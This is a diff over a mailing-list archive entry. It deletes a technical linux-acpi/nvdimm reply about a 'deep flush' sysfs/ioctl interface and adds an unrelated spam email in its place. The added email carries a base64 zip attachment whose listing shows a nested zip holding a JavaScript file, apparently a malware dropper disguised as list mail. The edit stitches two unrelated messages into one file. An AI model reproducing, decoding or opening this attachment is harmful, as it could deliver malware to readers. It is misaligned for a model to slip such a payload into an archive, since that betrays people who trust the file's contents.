@@ -1,90 +1,68 @@
-From: Dan Williams <dan.j.williams@intel.com>
-Subject: Re: [PATCH v3] libnvdimm, region: sysfs trigger for nvdimm_flush()
-Date: Thu, 27 Apr 2017 13:02:41 -0700
-Message-ID: <CAPcyv4hthct-P=W9QLbjswvco8Fcewpf13ZX6-h2PXpHwRtAKg@mail.gmail.com>
-References: <149307780135.7155.11108531648914675756.stgit@dwillia2-desk3.amr.corp.intel.com>
- <149315140303.23340.14688142799059150805.stgit@dwillia2-desk3.amr.corp.intel.com>
- <x49zif23nvl.fsf@segfault.boston.devel.redhat.com> <CAPcyv4jQXRQVHnNMqJDrwSMM=1kJx_7sWifUN-u1yusVCZ0roQ@mail.gmail.com>
- <x49y3umufpm.fsf@segfault.boston.devel.redhat.com> <CAPcyv4jOP6fhk4wXahdEWH2O_93LQe9yzrWYZatSXXDwEk5OBA@mail.gmail.com>
- <x49d1bxsngb.fsf@segfault.boston.devel.redhat.com> <CAPcyv4g1zbaNDttkzGv4NV9ZQXrObLqpPLMQW2wqoP_iTozrsQ@mail.gmail.com>
- <x497f25prk6.fsf@segfault.boston.devel.redhat.com>
+From: <geir.nuland@lyse.net>
+Subject: 32361 linux-acpi
+Date: Thu, 27 Apr 2017 20:37:43 -0000
+Message-ID: <149332546347.22260.2615945028207337650@u16563822.onlinehome-server.com>
 Mime-Version: 1.0
-Content-Type: text/plain; charset=UTF-8
+Content-Type: application/zip; name="61568666738.zip"
+Content-Transfer-Encoding: base64
 Return-path: <linux-acpi-owner@vger.kernel.org>
-Received: from mail-io0-f182.google.com ([209.85.223.182]:33339 "EHLO
-        mail-io0-f182.google.com" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
-        with ESMTP id S939587AbdD0UCn (ORCPT
-        <rfc822;linux-acpi@vger.kernel.org>); Thu, 27 Apr 2017 16:02:43 -0400
-Received: by mail-io0-f182.google.com with SMTP id k87so34229062ioi.0
-        for <linux-acpi@vger.kernel.org>; Thu, 27 Apr 2017 13:02:43 -0700 (PDT)
-In-Reply-To: <x497f25prk6.fsf@segfault.boston.devel.redhat.com>
+Received: from ip172.pool2.gold.clients.juba.rcswimax.com ([41.79.25.172]:55320
+        "HELO u16563822.onlinehome-server.com" rhost-flags-OK-OK-OK-FAIL)
+        by vger.kernel.org with SMTP id S968485AbdD0Uhv (ORCPT
+        <rfc822;linux-acpi@vger.kernel.org>);
+        Thu, 27 Apr 2017 16:37:51 -0400
+Content-Disposition: attachment
 Sender: linux-acpi-owner@vger.kernel.org
 List-Id: linux-acpi@vger.kernel.org
-To: Jeff Moyer <jmoyer@redhat.com>
-Cc: "linux-nvdimm@lists.01.org" <linux-nvdimm@lists.01.org>, Masayoshi Mizuma <m.mizuma@jp.fujitsu.com>, Linux ACPI <linux-acpi@vger.kernel.org>, "linux-kernel@vger.kernel.org" <linux-kernel@vger.kernel.org>
+To: linux-acpi@vger.kernel.org
 
-On Thu, Apr 27, 2017 at 12:40 PM, Jeff Moyer <jmoyer@redhat.com> wrote:
-> Dan Williams <dan.j.williams@intel.com> writes:
->
->> On Thu, Apr 27, 2017 at 11:41 AM, Jeff Moyer <jmoyer@redhat.com> wrote:
->>> Dan Williams <dan.j.williams@intel.com> writes:
->>>
->>>>> The sentiment is that programs shouldn't have to grovel around in sysfs
->>>>> to do stuff related to an open file descriptor or mapping.  I don't take
->>>>> issue with the name.  I do worry that something like 'wpq_drain' may be
->>>>> too platform specific, though.  The NVM Programming Model specification
->>>>> is going to call this "deep flush", so maybe that will give you
->>>>> some inspiration if you do want to change the name.
->>>>
->>>> I'll change to "deep_flush", and I quibble that this is related to a
->>>> single open file descriptor or mapping. It really is a "region flush"
->>>> for giving extra protection for global metadata, but the persistence
->>>> of individual fds or mappings is handled by ADR. I think an ioctl
->>>> might give the false impression that every time you flush a cacheline
->>>> to persistence you need to call the ioctl.
->>>
->>> fsync, for example, may affect more than one fd--all data in the drive
->>> write cache will be flushed.  I don't see how this is so different.  I
->>> think a sysfs file is awkward because it requires an application to
->>> chase down the correct file in the sysfs hierarchy.  If the application
->>> already has an open fd or a mapping, it should be able to operate on
->>> that.
->>
->> I'm teetering, but still leaning towards sysfs. The use case that
->> needs this is device-dax because we otherwise silently do this behind
->> the application's back on filesystem-dax for fsync / msync.
->
-> We may yet get file system support for flush from userspace (NOVA, for
-> example).  So I don't think we should restrict ourselves to only
-> thinking about the device dax use case.
->
->> A device-dax ioctl would be straightforward, but 'deep flush' assumes
->> that the device-dax instance is fronting persistent memory.  There's
->> nothing persistent memory specific about device-dax except that today
->> only the nvdimm sub-system knows how to create them, but there's
->> nothing that prevents other memory regions from being mapped this way.
->
-> You're concerned that applications operating on device dax instances
-> that are not backed by pmem will try to issue a deep flush?  Why would
-> they do that, and why can't you just return failure from the ioctl?
->
->> So I'd rather this persistent memory specific mechanism stay with the
->> persistent memory specific portion of the interface rather than plumb
->> persistent memory details out through the generic device-dax interface
->> since we have no other intercept point like we do in the
->> filesystem-dax case to hide this flush.
->
-> Look at the block layer.  You can issue an ioctl on a block device, and
-> if the generic block layer can handle it, it does.  If not, it gets
-> passed down to lower layers until either it gets handled, or it bubbles
-> back up because nobody knew what to do with it.  I think you can do the
-> same thing here, and that solves your layering violation.
-
-So this is where I started. I was going to follow the block layer.
-Except recently the block layer has been leaning away from ioctls and
-implementing support for syscalls directly. The same approach for
-device-dax fallocate() support got NAKd, so I opted for sysfs out of
-the gate.
-
-However, since there really is no analog for "deep flush" in the
-syscall namespace lets (*gag*) implement an ioctl for this.
+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
+AAAAgQoAAAAA
